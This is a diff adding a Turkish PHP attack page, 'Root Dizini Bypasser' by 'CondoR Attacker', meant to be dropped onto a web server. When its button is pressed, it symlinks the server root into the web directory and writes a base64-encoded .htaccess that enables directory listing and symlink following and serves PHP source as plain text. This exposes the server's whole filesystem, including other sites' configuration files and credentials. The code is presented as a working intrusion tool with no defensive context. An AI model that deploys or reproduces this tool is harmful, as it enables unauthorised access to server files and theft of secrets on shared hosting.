@@ -1,0 +1,21 @@
+<head>
+<title>Root Dizini Bypasser By CondoR </title>
+</head>
+<body bgcolor="black">
+<link rel="shortcut icon" href="http://i.hizliresim.com/j3o7Lg.jpg" type="image/x-icon" />
+<style type="text/css"><!-- {font-family:Courier 
+margin-left: 0px; margin-top: 0px; text-align: center; New;font-size:12px;color:#009900;font-weight:400;} 
+a{text-decoration:none;} a:link {color:#009900;} a:visited {color:#008080;} a:hover{color:#ff0000;} a:active {color:#00a2a2;} 
+--><!-- Made By CondoR Attacker --></style>
+<br><br><body bgColor="151515"><tr><td>
+<center><h1><img src="http://i.hizliresim.com/LyX49Z.png" height="200" width="750"><br></h1>
+<?php 
+echo '<font color="#ff0000"><b><br><br>Server Kerneli : '.php_uname().'<br></b><br></font>';
+echo "<form method='POST' action=''>" ; echo "
+<center><input type='submit' value='Bypassla' name='CondoR'></center>"; 
+if (isset($_POST['CondoR'])){ system('ln -s / CondoR.txt'); 
+$fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw'; 
+$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $CondoR = symlink("/","CondoR.txt"); 
+$rt="<br><a href=CondoR.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
+Bypass Basarılı</b></font></a>"; 
+echo "<br><br><b>Bitti!</b><br><br>Alttaki Kırmızı Yazıya Tıklayarak Root Dizinine Gec<br>$rt</center>";} echo "</form>";  ?></td></tr></body></html>
